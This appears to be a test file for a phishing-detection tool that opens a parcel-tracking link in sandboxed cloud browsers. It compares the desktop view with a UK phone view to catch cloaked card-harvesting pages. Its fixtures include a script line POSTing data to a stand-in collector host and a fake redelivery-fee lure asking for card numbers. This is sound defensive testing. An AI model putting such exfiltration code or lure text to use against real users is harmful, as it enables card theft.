import { describe, expect, it, vi } from "vitest";
import { routeFromProxy, visitInCloud, visitTwoFaces, type KernelLike } from "./kernel";

const smallShot = Buffer.alloc(2000, 1).toString("base64");
const TRACKING = "Parcel tracking. Your parcel is on its way and should arrive tomorrow between 9am and 5pm. Track another parcel.";
const FEE = "We missed you. A redelivery fee of 1.99 is due today. Enter your card number, expiry date and security code to rebook.";

const result = (over: Record<string, unknown> = {}, facts: Record<string, unknown> = {}) => ({
  success: true,
  result: {
    finalUrl: "https://parcels.example/track",
    title: "Track your parcel",
    facts: { password: false, card: false, login: false, giftCard: false, forms: 0, bank: false, moneyForms: [], scripts: "", ...facts },
    seen: { domChars: 200, visibleChars: TRACKING.length, visibleSample: TRACKING.slice(0, 60), visibleText: TRACKING, hidden: [] },
    isolated: true,
    shot: smallShot,
    ...over,
  },
});

const policyEcho = { DownloadRestrictions: 3 };
const telemetryEcho = { browser: { control: { enabled: true }, interaction: { enabled: true }, network: { enabled: true }, page: { enabled: true } } };
const ourNav = { event: { type: "page_navigation", category: "page", data: { url: "https://parcels.example/track", target_type: "page" } } };

function fake(execute: KernelLike["browsers"]["playwright"]["execute"], extra: Pick<KernelLike["browsers"], "telemetry"> = {}) {
  let n = 0;
  return {
    browsers: {
      ...extra,
      create: vi.fn(async (_body: Record<string, unknown>) => ({ session_id: `sess${++n}`, chrome_policy: policyEcho, telemetry: telemetryEcho })),
      deleteByID: vi.fn(async () => {}),
      playwright: { execute: vi.fn(execute) },
    },
  };
}

describe("visitInCloud: telemetry, downloads and proof", () => {
  it("asks KERNEL for network, page and interaction telemetry and to block every download", async () => {
    const k = fake(async () => result());
    await visitInCloud("https://parcels.example/track", { client: k, record: false });
    expect(k.browsers.create.mock.calls[0]![0]).toMatchObject({
      chrome_policy: { DownloadRestrictions: 3 },
      telemetry: { browser: { network: { enabled: true }, page: { enabled: true }, interaction: { enabled: true } } },
    });
  });

  it("builds the money trail and the proof from the visit's telemetry, and marks the browser deleted", async () => {
    const events = vi.fn(async () => ({
      items: [
        ourNav,
        { event: { type: "network_request", category: "network", data: { resource_type: "Document", target_type: "page", url: "https://parcels.example/track" } } },
        { event: { type: "network_response", category: "network", data: { resource_type: "Script", url: "https://parcels.example/app.js", body: 'fetch("https://collect-x.example/c", {method:"POST"})' } } },
        { event: { type: "cdp_command", category: "control", data: { method: "Page.navigate" } } },
      ],
    }));
    const k = fake(async () => result({}, { card: true, moneyForms: [{ action: "https://parcels.example/track", card: true, bank: false, box: null }] }), { telemetry: { events } });
    const v = await visitInCloud("https://parcels.example/track", { client: k, record: false });
    expect(v.ok).toBe(true);
    if (!v.ok) return;
    expect(events).toHaveBeenCalledWith("sess1", expect.objectContaining({ category: expect.arrayContaining(["network", "page", "interaction", "control"]) }));
    expect(v.trail).toMatchObject({ offsite: { host: "collect-x.example", how: "script" }, stepsFrom: "network log" });
    expect(v.proof).toMatchObject({ clicks: 0, keys: 0, scrolls: 0, downloadsBlocked: true, deleted: true });
    expect(v.proof!.apiCalls).toBeGreaterThanOrEqual(3);
    expect(v.proof!.hashes.screenshot).toMatch(/^[0-9a-f]{64}$/);
  });

  it("says 'not recorded' when the telemetry log doesn't even show the page Spotter opened", async () => {
    const k = fake(async () => result(), { telemetry: { events: vi.fn(async () => ({ items: [] })) } });
    const v = await visitInCloud("https://parcels.example/track", { client: k, record: false });
    expect(v.ok && v.proof).toMatchObject({ clicks: null, keys: null, scrolls: null, downloadsBlocked: true });
    expect(v.ok && v.trail?.stepsFrom).toBe("start and end only");
  });

  it("says 'not recorded' when reading telemetry fails, and keeps the visit", async () => {
    const k = fake(async () => result(), { telemetry: { events: vi.fn(async () => Promise.reject(new Error("telemetry 500"))) } });
    const v = await visitInCloud("https://parcels.example/track", { client: k, record: false });
    expect(v.ok).toBe(true);
    expect(v.ok && v.proof?.clicks).toBeNull();
  });

  it("marks the browser not deleted when the delete fails", async () => {
    const k = fake(async () => result());
    k.browsers.deleteByID.mockRejectedValueOnce(new Error("500"));
    const v = await visitInCloud("https://parcels.example/track", { client: k, record: false });
    expect(v.ok && v.proof?.deleted).toBe(false);
  });
});

describe("visitInCloud as Gran's phone", () => {
  it("opens a phone sized browser with a UK network, phone browser, UK language and time zone, and only reads", async () => {
    const k = fake(async () => result());
    const v = await visitInCloud("https://parcels.example/track", { client: k, face: "phone", network: { proxyId: "px1", kind: "uk_mobile", region: "eu-west" } });
    expect(k.browsers.create.mock.calls[0]![0]).toMatchObject({ headless: false, viewport: { width: 390, height: 844 }, proxy: { id: "px1" }, region: "eu-west" });
    const { code } = k.browsers.playwright.execute.mock.calls[0]![1];
    expect(code).toContain("Emulation.setUserAgentOverride");
    expect(code).toContain("Mobile Safari");
    expect(code).toContain("en-GB");
    expect(code).toContain("Europe/London");
    expect(code).not.toContain("width: 800");
    expect(code).not.toMatch(/\.(fill|type|click|press|check|selectOption|setInputFiles|tap)\(|submit|keyboard|mouse/);
    expect(v.ok && v.network).toBe("uk_mobile");
  });

  it("falls back to a plain phone browser (and says so) when KERNEL refuses the UK network", async () => {
    const k = fake(async () => result());
    k.browsers.create.mockRejectedValueOnce(Object.assign(new Error("403 proxies need a paid plan"), { status: 403 }));
    const v = await visitInCloud("https://parcels.example/track", { client: k, face: "phone", network: { proxyId: "px1", kind: "uk_mobile", region: "eu-west" } });
    expect(k.browsers.create).toHaveBeenCalledTimes(2);
    expect(k.browsers.create.mock.calls[1]![0]).not.toHaveProperty("proxy");
    expect(k.browsers.create.mock.calls[1]![0]).not.toHaveProperty("region");
    expect(v.ok && v.network).toBe("direct");
  });
});

describe("honest edges", () => {
  it("only a GB mobile or residential proxy that is available counts as a UK network", () => {
    expect(routeFromProxy({ id: "p", type: "mobile", status: "available", config: { country: "gb" } })).toEqual({ proxyId: "p", kind: "uk_mobile", region: "eu-west" });
    expect(routeFromProxy({ id: "p", type: "residential", config: { country: "GB" } })).toMatchObject({ kind: "uk_residential" });
    expect(routeFromProxy({ id: "p", type: "mobile", config: { country: "US" } })).toEqual({ kind: "direct" });
    expect(routeFromProxy({ id: "p", type: "datacenter", config: { country: "GB" } })).toEqual({ kind: "direct" });
    expect(routeFromProxy({ id: "p", type: "mobile", status: "unavailable", config: { country: "GB" } })).toEqual({ kind: "direct" });
  });

  it("doesn't retry without the proxy after a timeout or server error (a browser may exist), the phone visit just fails", async () => {
    const k = fake(async () => result());
    k.browsers.create.mockRejectedValueOnce(Object.assign(new Error("502 bad gateway"), { status: 502 }));
    const v = await visitInCloud("https://parcels.example/track", { client: k, face: "phone", network: { proxyId: "px1", kind: "uk_mobile" } });
    expect(k.browsers.create).toHaveBeenCalledTimes(1);
    expect(v.ok).toBe(false);
  });

  it("treats a cut off telemetry log as not recorded", async () => {
    const many = Array.from({ length: 1000 }, () => ourNav);
    const k = fake(async () => result(), { telemetry: { events: vi.fn(async () => ({ items: many })) } });
    const v = await visitInCloud("https://parcels.example/track", { client: k, record: false });
    expect(v.ok && v.proof?.clicks).toBeNull();
    const k2 = fake(async () => result(), { telemetry: { events: vi.fn(async () => ({ items: [ourNav], has_more: true })) } });
    const v2 = await visitInCloud("https://parcels.example/track", { client: k2, record: false });
    expect(v2.ok && v2.proof?.keys).toBeNull();
  });

  it("when the phone visit failed, the proof doesn't claim zero clicks or deletes for both browsers", async () => {
    const events = vi.fn(async () => ({ items: [ourNav] }));
    const k = fake(async (_id, body) => (body.code.includes("Emulation.setUserAgentOverride") ? { success: false, error: "boom" } : result()), { telemetry: { events } });
    const v = await visitTwoFaces("https://parcels.example/track", { client: k, network: { kind: "direct" } });
    expect(v.ok && v.proof).toMatchObject({ clicks: null, keys: null, scrolls: null, downloadsBlocked: null });
    expect(v.ok && v.proof?.deleted).toBeUndefined();
  });
});

describe("visitTwoFaces", () => {
  it("opens the same link twice at once, deletes both browsers and files the difference when only the phone gets a card form", async () => {
    const k = fake(async (_id, body) =>
      body.code.includes("Emulation.setUserAgentOverride")
        ? result({ title: "Redelivery fee", seen: { domChars: 200, visibleChars: FEE.length, visibleSample: FEE.slice(0, 60), visibleText: FEE, hidden: [] } }, { card: true, moneyForms: [{ action: "https://collect-x.example/pay", card: true, bank: false, box: { x: 0.05, y: 0.3, w: 0.9, h: 0.4 } }] })
        : result(),
    );
    const v = await visitTwoFaces("https://parcels.example/track", { client: k, network: { proxyId: "px1", kind: "uk_mobile" } });
    expect(k.browsers.create).toHaveBeenCalledTimes(2);
    expect(k.browsers.deleteByID).toHaveBeenCalledWith("sess1");
    expect(k.browsers.deleteByID).toHaveBeenCalledWith("sess2");
    expect(v.ok).toBe(true);
    if (!v.ok) return;
    expect(v.faces).toMatchObject({ compared: true, differs: true });
    expect(v.faces!.verdict).toMatch(/phones in the UK than to security scanners/);
    expect(v.phone).toMatchObject({ network: "uk_mobile", asks: { card: true }, moneyBox: { x: 0.05, y: 0.3, w: 0.9, h: 0.4 } });
    expect(v.phone!.screenshot).toMatch(/^data:image\/jpeg;base64,/);
    // Only the phone had the card form, so the money trail is the phone's, and the proof covers both browsers.
    expect(v.trail).toMatchObject({ offsite: { host: "collect-x.example", how: "form" }, face: "phone" });
    expect(v.trail!.line).toMatch(/^On the phone version, card details would go to collect-x\.example/);
    expect(v.proof!.apiCalls).toBeGreaterThanOrEqual(6);
    expect(v.proof!.hashes.phoneScreenshot).toMatch(/^[0-9a-f]{64}$/);
  });

  it("keeps the desktop visit and says it couldn't compare when the phone visit fails", async () => {
    const k = fake(async (_id, body) => (body.code.includes("Emulation.setUserAgentOverride") ? { success: false, error: "net::ERR_TUNNEL_CONNECTION_FAILED" } : result()));
    const v = await visitTwoFaces("https://parcels.example/track", { client: k, network: { kind: "direct" } });
    expect(v.ok).toBe(true);
    expect(v.ok && v.faces).toMatchObject({ compared: false });
    expect(v.ok && v.phone).toBeUndefined();
  });
});
